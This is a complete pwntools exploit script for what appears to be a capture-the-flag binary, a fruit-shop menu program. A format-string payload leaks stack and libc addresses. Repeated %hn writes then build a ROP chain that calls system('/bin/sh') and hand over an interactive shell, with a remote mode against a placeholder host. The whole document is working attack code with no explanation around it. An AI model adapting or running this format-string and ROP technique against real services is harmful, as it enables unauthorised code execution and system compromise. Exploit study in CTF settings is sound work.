#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
exe = context.binary = ELF('./pwnable_1_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	brva 0x0000000000001D82
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def buy(p_or_b, quan, ship, address):
	p.sendlineafter(b"Input:", str(1))
	p.sendlineafter(b"banana (1)?:", str(p_or_b))
	p.sendlineafter(b"quantity:", str(quan))
	p.sendlineafter(b"address? (Y/N):", ship)
	p.sendline(address)

def show():
	p.sendlineafter(b"Input:", str(2))

def change_label(idx, data):
	p.sendlineafter(b"Input:", str(3))
	p.sendlineafter(b"label:", str(idx))
	p.sendlineafter(b"gift label:",data)

# STAGE 1: Leak libc, stack

pl = flat(b"A"*(0x40), b"%10$p|%15$p|")
buy(1, -1, b'Y', pl)
change_label(1, b"d1nhdwc111")
show()
p.recvuntil(b"65531|")
stack_rip = int(p.recvuntil(b"|", drop = True),16) + 8
libc.address = int(p.recvuntil(b"|", drop = True),16) - 0x29d90

log.info("stack_leak: " + hex(stack_rip))
log.info("libc_leak: " + hex(libc.address))

# STAGE 2: Overwrite rip -> system libc

pop_rdi = libc.address + 0x000000000002a3e5
ret = pop_rdi + 1
bin_sh = next(libc.search(b"/bin/sh\0"))
system = libc.sym.system

log.info("pop_rdi:" + hex(pop_rdi))
log.info("ret: " + hex(ret))
log.info("/bin/sh: " + hex(bin_sh))
log.info("system: " + hex(system))


def overwrite(saved_rip, value, idx1, idx2):

	pl = flat(b"A"*0x40, f"%{saved_rip & 0xffff}c%19$hn".encode())
	buy(1, -1, b'Y', pl)
	change_label(idx1, b"d1nhdwc123")
	show()

	pl = flat(b"A"*0x40, f"%{value & 0xffff}c%49$hn".encode())
	buy(1, -1, b'Y', pl)
	change_label(idx2, b"d1nhdwc123")
	show()

overwrite(stack_rip, pop_rdi, 2, 3)

overwrite(stack_rip + 0x8, bin_sh, 4, 5)
overwrite(stack_rip + 0x8 + 2, bin_sh >> 16, 6, 7)
overwrite(stack_rip + 0x8 + 4, bin_sh >> 32, 8, 9)

overwrite(stack_rip + 0x10, ret, 10, 11)
overwrite(stack_rip + 0x10 + 2, ret >> 16, 12, 13)
overwrite(stack_rip + 0x10 + 4, ret >> 32, 14, 15)

overwrite(stack_rip + 0x18, system, 16, 17)
overwrite(stack_rip + 0x18 + 2, system >> 16, 18, 19)
overwrite(stack_rip + 0x18 + 4, system >> 32, 20, 21)
# GDB()
p.sendlineafter(b"Input:", str(5))
p.interactive()